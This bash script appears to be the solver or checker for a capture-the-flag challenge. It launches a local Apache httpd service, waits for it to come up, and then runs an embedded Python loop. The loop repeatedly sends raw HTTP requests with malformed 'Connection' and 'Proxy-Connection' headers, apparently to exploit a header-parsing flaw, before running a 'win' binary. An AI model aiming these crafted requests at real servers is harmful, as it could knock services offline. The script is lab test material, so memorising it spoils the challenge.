#!/usr/bin/env bash
set -euo pipefail

INIT_LOG=$(mktemp)

cleanup() {
  if [[ -n "${svc_pid:-}" ]] && kill -0 "$svc_pid" 2>/dev/null; then
    kill "$svc_pid" 2>/dev/null || true
    wait "$svc_pid" 2>/dev/null || true
  fi
  if [[ -s "$INIT_LOG" ]]; then
    echo "--- .init output ---" >&2
    cat "$INIT_LOG" >&2 || true
  fi
  if [[ -f /opt/httpd/logs/error_log ]]; then
    echo "--- Apache error_log ---" >&2
    tail -n 80 /opt/httpd/logs/error_log >&2 || true
  fi
  rm -f "$INIT_LOG"
}
trap cleanup EXIT

PYTHON="${PYTHON:-python3}"

/challenge/.init >"$INIT_LOG" 2>&1 &
svc_pid=$!

retry() {
  local tries="$1" delay="$2"; shift 2
  for ((i=1; i<=tries; i++)); do
    if "$@"; then return 0; fi
    sleep "$delay"
  done
  return 1
}

check_httpd() {
  if ! kill -0 "$svc_pid" 2>/dev/null; then
    echo "init process exited unexpectedly" >&2
    return 1
  fi
  curl -fsS http://127.0.0.1/health >/dev/null
}

retry 120 0.5 check_httpd

$PYTHON - <<'PY'
import socket
import time

REQUEST = (
    "GET / HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "User-Agent: exploit-test\r\n"
    "Accept: */*\r\n"
    "Connection: keep-alive, ;\r\n"
    "Keep-Alive: timeout=5\r\n"
    "Proxy-Connection: keep-alive, ;\r\n"
    "\r\n"
).encode()

for attempt in range(60):
    try:
        with socket.create_connection(("127.0.0.1", 80), timeout=1) as sock:
            sock.sendall(REQUEST)
            try:
                sock.recv(512)
            except OSError:
                pass
    except OSError:
        time.sleep(0.1)
    time.sleep(0.05)
PY

retry 40 0.5 /challenge/bin/win
